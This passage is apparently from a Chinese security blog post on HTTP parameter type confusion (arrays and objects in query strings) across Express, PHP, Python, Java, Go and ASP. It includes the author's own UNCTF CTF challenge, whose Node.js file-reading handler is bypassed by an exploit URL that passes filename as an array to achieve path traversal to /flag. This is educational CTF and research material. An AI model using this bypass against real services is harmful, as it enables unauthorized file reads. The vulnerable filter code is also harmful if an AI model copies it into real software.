    var app = express();
    app.get('/', function (req, res) {
       console.log(req.query.name)
       res.send('Hello World');
    })
    var server = app.listen(8081, function () {
      var host = server.address().address
      var port = server.address().port
    })
输入
?name[123]=123&name[456]=asd
输出
{ '123': '123', '456': 'asd' }
* * *
我们把
`console.log(req.query.name)`
改成
`console.log(req.query.name.password)`
输入
/?name[password]=123456
输出
123456
我们来看几个好玩的
输入 | 输出  
---|---  
`?name[]=123456&name[][a]=123` | `[ '123456', { a: '123' } ]`  
`?name[a]=123456&name=b` | `{ a: '123456', b: true }`  
`?name[a]=123456&name[a]=b` | `{ a: [ '123456', 'b' ] }`  
`?name[][a]=123456&name[][a]=b` | `[ { a: [ '123456', 'b' ] } ]`  
感觉有点像HPP漏洞，但实际又不是
### UNCTF
在UNCTF中，我就用到了此特性，出了一道有点意思的CTF题(arbi第三关）  
源码
    const fs = require("fs");
    module.exports = function(req,res){
        if(req.session.username !== "admin"){
            return res.send("U Are N0t Admin")
        }
        if(req.query.name === undefined){
            return res.sendStatus(500)
        }
        else if(typeof(req.query.name) === "string"){
            if(req.query.name.startsWith('{') && req.query.name.endsWith('}')){
                req.query.name = JSON.parse(req.query.name)
                if(!/^key$/im.test(req.query.name.filename))return res.sendStatus(500);
            }
        }
        var filename = ""
        if(req.query.name.filename.length > 3){
            for(let c of req.query.name.filename){
                if(c !== "/" && c!=="."){
                    filename += c
                }
            }
        }
        console.log(filename)
        var content = fs.readFileSync("/etc/"+filename)
        res.send(content)
      }
最终的目的是绕过其他的过滤走到第32行，读取根目录/flag的文件  
首先根据前面的关卡伪造admin绕过第三行的判断  
可以发现，如果进入了第9行的判断，14行的正则会强行要求我们输入的filename参数必须是key，根本无法读取flag  
22行的条件语句很有迷惑性，看上去好像是判断输入的字符串长度是否大于3，如果大于，会把其中所有的.和/删去  
如果我们输入的filename参数为普通的字符串，我们根本无法绕过这两层过滤，要获取flag，filename必须是../flag才行  
但其实，根据express的特性，我们完全可以构造filename为一个数组，name为对象，  
exp：  
`/admin23333_interface?name[filename]=../&name[filename]=f&name[filename]=l&name[filename]=a&name[filename]=g`  
由于name不为字符串，绕过了第9层过滤，filename为数组，在经过22行的条件语句的时候，由于.length操作和迭代器语法同时可以作用于字符串和数组，存在一个语法上的重复。而针对数组的时候，25行的
+= 又会完美的把数组还原成字符串，最终进入32行的文件读取。所以上面的exp，可以完美的绕过所有的判断，最终读取/flag
结合一下数组和对象通用方法 我觉得，这方面express很多有趣的特性可以去发现
## PHP
php可以从url中获取数组类型,然而可惜的是，php 对于数组和字符串 官方文档中说明，存在重复的语法很少，输出语法中，数组只会被替换为 "Array"
字符串。  
但是，数组传入一些函数都会获得一些奇怪的返回值，这就是很多弱类型CTF题目的考法，可以通过url传入数组，进入一个函数，获得一个奇怪的返回值绕过。所以我觉得，在这个方向，PHP还是存在一定的挖掘空间的。
## Python
Python的框架貌似不太支持http传入奇怪的东西
经测试
django 和 flask默认不支持传入奇怪的东西（只能传入字符串）
web2py框架支持传入列表
tornado的`self.get_query_argument`只会获取一个参数，`self.get_query_arguments`可以获取列表
很可惜，如果我们通过一种方式获取到非字符串类型的数据类型（比如json传递，xml传输等），在Python中，我们也能有好玩的方式
PS: Py不像Js那样，获取列表字典的值必须要用xxx["xxx"]的语法而不能用xxx.xxx
废话不多说 看代码
    a = "qwertyuiop"
    b = ["aaa","bbb","ccc","ddd"]
    c = "----%s----" %b
    print(a[:3])
    print(b[:3])
    print(c)
结果
    [evoA@Sycl0ver]#> python test.py
    qwe
    ['aaa', 'bbb', 'ccc']
    ----['aaa', 'bbb', 'ccc', 'ddd']----
同样，python也有全局方法 参数既可以是字符串也可以是变量
    a=dir("123")
    b=dir([1,2,3,4])
    tmp = [val for val in a if val in b]
    #取a b 交集
    print tmp
结果
    ['__add__', '__class__', '__contains__', '__delattr__', '__dir__', '__doc__', '__eq__', '__format__', '__ge__', '__getattribute__', '__getitem__', '__gt__', '__hash__', '__init__', '__init_subclass__', '__iter__', '__le__', '__len__', '__lt__', '__mul__', '__ne__', '__new__', '__reduce__', '__reduce_ex__', '__repr__', '__rmul__', '__setattr__', '__sizeof__', '__str__', '__subclasshook__', 'count', 'index']
可能在这个攻击面上，Python原生提供的方法，确实比较难利用，但是还有很多库和函数没有去测试，我也相信，如果能有一个有趣的数据传输方式，配合python那么多的库和函数，也会有很多很多有趣的攻击方式
## Java
其实我在没测试的时候就猜到了结果
测试发现Springboot 存在HPP漏洞，多个url参数会自动拼接 并用,分割，并不会转换类型
原生JSP & Servlet 在这个方面不存在任何漏洞 果然Java严格数据类型还是牛逼（破音
## Go
我不会什么Go的框架，只测试了Beego，由于Go的强类型
beego也是提供严格的变量获取方法,调用方法的不同决定了参数的类型
比如GetString 返回字符串 GetInt 返回整形 GetStrings返回字符数组，把url变量相同的放到一个数组中
所以正常来说，Go也是真的很安全的
## asp & aspx
测试只发现存在HPP漏洞，多个参数用","分割，不能变为其他数据类型
## 后话
当然，这些利用方式比较单调，除了node有一定的花样外，其他的都比较单一，但是我们也可把眼光方法放大，除了url传参，还有json，xml，protobuf等等数据传输方式，核心的思想还是后端没有有效校验用户传入的数据类型造成的差异。这里只是抛砖引玉，希望之后，能有越来越多关于此方面的攻击利用的好思路